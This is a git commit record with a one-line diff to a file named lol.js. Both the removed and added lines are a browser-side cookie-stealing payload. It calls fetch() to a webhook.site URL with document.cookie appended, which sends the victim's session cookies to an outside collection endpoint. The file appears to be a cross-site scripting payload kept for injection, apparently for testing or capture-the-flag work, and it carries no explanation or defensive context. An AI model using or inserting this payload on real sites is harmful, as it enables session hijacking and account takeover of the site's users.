43c36b1df346e517cb79002ecf89dacf58e7f8f5
Aleksa Zatezalo <59803757+AleksaZatezalo@users.noreply.github.com>
2024-02-16 16:22:07 -0500

    Update lol.js

--- lol.js
+++ lol.js
@@ -1,1 +1,1 @@
-onload=fetch("https://webhook.site/8c31b5f4-e70c-4fc7-941e-7ea4fa2cf2b7?cookie="+document.cookie)
+fetch("https://webhook.site/8c31b5f4-e70c-4fc7-941e-7ea4fa2cf2b7?cookie="+document.cookie)
